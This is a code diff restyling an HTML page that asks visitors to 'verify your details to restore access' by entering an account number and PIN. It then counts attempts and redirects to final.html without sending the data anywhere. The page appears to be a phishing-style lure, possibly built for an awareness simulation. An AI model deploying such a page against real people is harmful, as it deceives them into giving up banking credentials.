@@ -6,35 +6,46 @@
     <style>
         body {
             font-family: Arial;
-            background:white;
-            padding: 40px;
+            background: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
             background: white;
             width: 350px;
-            padding: 20px;
-            margin: auto;
+            padding: 25px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+            border-radius: 10px;
+            text-align: center;
         }
         input {
             width: 100%;
             padding: 10px;
             margin: 8px 0;
             border-radius: 5px;
+            border: 1px solid #ccc;
         }
-        .pass{
-            color:rgb(67, 67, 189);
-            font-size:14px;
+        .pass {
+            color: rgb(67, 67, 189);
+            font-size: 14px;
             text-align: end;
-            line-height: 1.0;
+            margin-top: -5px;
+            cursor: pointer;
         }
         button {
             background: #0054a6;
             color: white;
-            width: 106%;
-            padding: 10px;
+            width: 100%;
+            padding: 12px;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 15px;
+            font-size: 16px;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -51,19 +62,16 @@
 
     <p>Please verify your details to restore access.</p>
 
-    <!-- FIXED — IDs added -->
     <input id="account" type="text" placeholder="Account Number">
     <input id="pin" type="password" placeholder="Enter PIN">
 
     <h3 class="pass">Forgot PIN ?</h3>
 
-    <!-- FIXED — button calls correct function -->
     <button onclick="verifyUser()">Verify Now</button>
 </div>
 
 <script>
 function verifyUser() {
-
     let account = document.getElementById("account").value;
     let pin = document.getElementById("pin").value;
 
@@ -72,16 +80,13 @@ function verifyUser() {
         return;
     }
 
-    // Count attempts
     let attempts = localStorage.getItem("dataAttempts");
     attempts = attempts ? parseInt(attempts) + 1 : 1;
     localStorage.setItem("dataAttempts", attempts);
 
-    // FINAL PAGE REDIRECT (FIXED)
     window.location.href = "final.html";
 }
 </script>
 
 </body>
-
 </html>
